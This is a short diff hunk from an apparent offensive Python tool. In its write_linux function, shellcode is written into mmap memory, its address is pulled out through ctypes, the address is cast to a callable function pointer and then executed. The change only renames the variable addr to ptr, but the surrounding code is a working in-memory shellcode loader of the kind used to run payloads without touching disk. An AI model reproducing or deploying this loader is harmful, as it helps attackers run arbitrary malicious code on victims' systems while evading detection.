@@ -47,10 +47,10 @@ def write_linux(str1):
     print("[+] Running shellcode in memory...")
     mm.write(str1)
 
-    addr = int.from_bytes(ctypes.string_at(id(mm) + 16, 8), "little")
+    ptr = int.from_bytes(ctypes.string_at(id(mm) + 16, 8), "little")
 
     functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
-    fn = functype(addr)
+    fn = functype(ptr)
     time.sleep(2)
     fn()
 
